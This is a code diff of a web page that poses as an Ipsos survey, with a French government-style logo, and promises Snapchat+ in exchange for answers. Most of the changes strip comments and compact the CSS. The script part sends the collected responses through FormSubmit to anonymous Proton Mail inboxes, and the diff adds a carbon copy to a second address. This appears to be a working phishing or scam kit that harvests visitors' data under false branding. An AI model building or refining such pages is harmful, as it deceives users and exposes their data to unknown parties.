@@ -12,8 +12,6 @@ body {
     background:#f4f6f9;
     margin:0;
 }
-
-/* HEADER */
 .header {
     background:#003b7a;
     padding:25px 30px;
@@ -22,23 +20,9 @@ body {
     justify-content:center;
     position:relative;
 }
-
-.header img {
-    height:50px;
-}
-
-.header a {
-    position:absolute;
-    left:30px;
-}
-
-.header-text {
-    color:white;
-    font-size:26px;
-    font-weight:700;
-}
-
-/* LOGO FRANCE FIXE */
+.header img { height:50px; }
+.header a { position:absolute; left:30px; }
+.header-text { color:white; font-size:26px; font-weight:700; }
 .logo-fixed {
     position:fixed;
     top:20px;
@@ -46,8 +30,6 @@ body {
     height:55px;
     z-index:999;
 }
-
-/* CONTENU */
 .box {
     max-width:650px;
     margin:60px auto;
@@ -56,10 +38,8 @@ body {
     border-radius:12px;
     box-shadow:0 4px 12px rgba(0,0,0,0.1);
 }
-
 h2 { font-size:30px; margin-bottom:20px; }
 p { font-size:20px; margin-bottom:25px; }
-
 input {
     width:100%;
     padding:14px;
@@ -67,8 +47,6 @@ input {
     border-radius:6px;
     border:1px solid #ccc;
 }
-
-/* BOUTON */
 button {
     margin-top:25px;
     padding:14px 26px;
@@ -79,11 +57,8 @@ button {
     cursor:pointer;
     font-size:20px;
 }
-
 button:hover { background:#005fa3; }
 button:disabled { background:#b0b0b0; cursor:not-allowed; }
-
-/* PROGRESSION */
 .progress-container {
     width:100%;
     height:10px;
@@ -91,35 +66,28 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     border-radius:5px;
     margin-bottom:25px;
 }
-
 .progress-bar {
     height:100%;
     width:0%;
     background:#0078d4;
     transition:width 0.3s ease;
 }
-
-/* PARTENARIAT */
 #partenariat {
     display:none;
     text-align:center;
     margin-top:35px;
 }
-
 #partenariat .title {
     font-size:22px;
     font-weight:700;
     color:#d00000;
     margin-bottom:12px;
 }
-
 #partenariat .operateurs {
     font-size:26px;
     font-weight:800;
     color:#d00000;
 }
-
-/* PIED DE PAGE */
 .footer {
     text-align:center;
     padding:20px 0;
@@ -128,8 +96,6 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     margin-top:40px;
     border-top:1px solid #ddd;
 }
-
-/* RESPONSIVE */
 @media(max-width:600px){
     .box{margin:20px;padding:25px}
     h2{font-size:24px}
@@ -139,7 +105,6 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
 
 <body>
 
-<!-- Logo France fixe -->
 <img src="francelogo.png" class="logo-fixed" alt="France">
 
 <div class="header">
@@ -149,14 +114,12 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     <div class="header-text">Ipsos – Sondage</div>
 </div>
 
-<!-- INTRO -->
 <div class="box" id="intro">
     <h2>Sondage express</h2>
     <p>Répondez à ce court sondage pour bénéficier de <strong>Snapchat+</strong> 🎁</p>
     <button onclick="demarrer()">Commencer</button>
 </div>
 
-<!-- INTERMEDIAIRE (TEXTE COMPLET CONSERVÉ) -->
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci !</h2>
     <h3>
@@ -165,7 +128,6 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     <button onclick="continuer()">Continuer</button>
 </div>
 
-<!-- SONDAGE -->
 <div class="box" id="sondage" style="display:none;">
     <div class="progress-container">
         <div class="progress-bar" id="progressBar"></div>
@@ -276,7 +238,6 @@ function continuer(){
     afficherQuestion();
 }
 
-// ⚡ CORRECTION ENVOI FORMULAIRES
 function envoyer(){
     const formData = new FormData();
     formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
@@ -288,14 +249,12 @@ function envoyer(){
     formData.append("_captcha", "false");
     formData.append("_template", "table");
     formData.append("_subject", "Réponses sondage Snapchat+");
+    formData.append("_cc", "becteurfoou@proton.me");
 
-    // ENVOI UNIQUE propre aux deux emails confirmés sur FormSubmit
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com,becteurfoou@proton.me", {
+    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
         method: "POST",
         body: formData
-    })
-    .then(() => console.log("Mails envoyés avec succès"))
-    .catch(err => console.error("Erreur envoi:", err));
+    });
 }
 </script>
 
